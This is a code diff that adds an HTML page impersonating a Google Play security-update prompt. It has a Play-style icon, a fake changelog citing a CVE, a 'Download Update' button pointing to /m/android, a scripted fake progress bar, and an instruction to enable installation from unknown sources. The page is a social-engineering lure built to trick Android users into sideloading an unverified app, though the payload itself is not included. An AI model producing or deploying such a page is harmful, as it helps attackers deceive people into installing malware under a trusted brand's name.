@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Update Required</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Roboto, 'Google Sans', sans-serif;
+    background: #202124; color: #e8eaed;
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: #292a2d; border-radius: 12px; padding: 28px 24px;
+    max-width: 360px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+  }
+  .logo { text-align: center; margin-bottom: 20px; }
+  .logo svg { width: 64px; height: 64px; }
+  h1 { font-size: 20px; font-weight: 500; margin-bottom: 8px; text-align: center; color: #e8eaed; }
+  .version { text-align: center; font-size: 13px; color: #9aa0a6; margin-bottom: 20px; }
+  .changelog { background: #35363a; border-radius: 8px; padding: 14px; margin-bottom: 20px; }
+  .changelog h3 { font-size: 13px; color: #bdc1c6; margin-bottom: 8px; font-weight: 500; }
+  .changelog ul { list-style: none; }
+  .changelog ul li { font-size: 13px; color: #9aa0a6; padding: 3px 0; padding-left: 16px; position: relative; }
+  .changelog ul li::before { content: '•'; position: absolute; left: 0; color: #1a73e8; }
+  .size { text-align: center; font-size: 12px; color: #9aa0a6; margin-bottom: 20px; }
+  .size span { background: #35363a; padding: 4px 10px; border-radius: 12px; }
+  .btn {
+    display: block; width: 100%; padding: 13px;
+    background: #1a73e8; color: white; border: none;
+    border-radius: 8px; font-size: 15px; font-weight: 500;
+    cursor: pointer; text-align: center; text-decoration: none;
+    transition: background 0.2s;
+  }
+  .btn:active { background: #1557b0; }
+  .progress { display: none; margin-top: 16px; }
+  .progress-bar { height: 4px; background: #35363a; border-radius: 2px; overflow: hidden; }
+  .progress-fill { height: 100%; background: #1a73e8; border-radius: 2px; width: 0%; transition: width 0.1s; }
+  .progress-text { font-size: 12px; color: #9aa0a6; text-align: center; margin-top: 8px; }
+  .warning { font-size: 11px; color: #9aa0a6; text-align: center; margin-top: 12px; }
+  .warning a { color: #8ab4f8; text-decoration: none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <!-- Google Play Store icon SVG -->
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="24" height="24" rx="5" fill="#01875f"/>
+      <path d="M5 4.5L14.5 12L5 19.5V4.5Z" fill="white"/>
+      <path d="M14.5 12L18 9L5 4.5L14.5 12Z" fill="#a4e8b9"/>
+      <path d="M14.5 12L18 15L5 19.5L14.5 12Z" fill="#ffb300"/>
+      <path d="M18 9L20 10.2L18 15L14.5 12L18 9Z" fill="#ff3d00"/>
+    </svg>
+  </div>
+
+  <h1>Security Update Available</h1>
+  <div class="version">Version 3.2.1 → <strong>3.2.4</strong> &nbsp;·&nbsp; Required</div>
+
+  <div class="changelog">
+    <h3>What's new:</h3>
+    <ul>
+      <li>Critical security patch (CVE-2026-1834)</li>
+      <li>Performance improvements</li>
+      <li>Bug fixes and stability updates</li>
+      <li>Updated privacy controls</li>
+    </ul>
+  </div>
+
+  <div class="size"><span>📦 &nbsp;12.4 MB</span></div>
+
+  <a id="btn" class="btn" href="/m/android">Download Update</a>
+
+  <div class="progress" id="progress">
+    <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+    <div class="progress-text" id="prog-text">Downloading... 0%</div>
+  </div>
+
+  <p class="warning">
+    If prompted, allow installation from unknown sources in
+    <a href="#">Settings → Security → Unknown Sources</a>
+  </p>
+</div>
+
+<script>
+document.getElementById('btn').addEventListener('click', function(e) {
+    var btn = this;
+    var prog = document.getElementById('progress');
+    var fill = document.getElementById('fill');
+    var txt  = document.getElementById('prog-text');
+
+    btn.textContent = 'Downloading...';
+    btn.style.background = '#1557b0';
+    prog.style.display = 'block';
+
+    var pct = 0;
+    var iv = setInterval(function() {
+        pct += Math.random() * 12 + 3;
+        if (pct > 95) pct = 95;
+        fill.style.width = pct + '%';
+        txt.textContent = 'Downloading... ' + Math.round(pct) + '%';
+    }, 300);
+
+    setTimeout(function() {
+        clearInterval(iv);
+        fill.style.width = '100%';
+        txt.textContent = 'Download complete — tap Open to install';
+        btn.textContent = 'Open';
+        btn.style.background = '#1a73e8';
+    }, 4500);
+});
+</script>
+</body>
+</html>
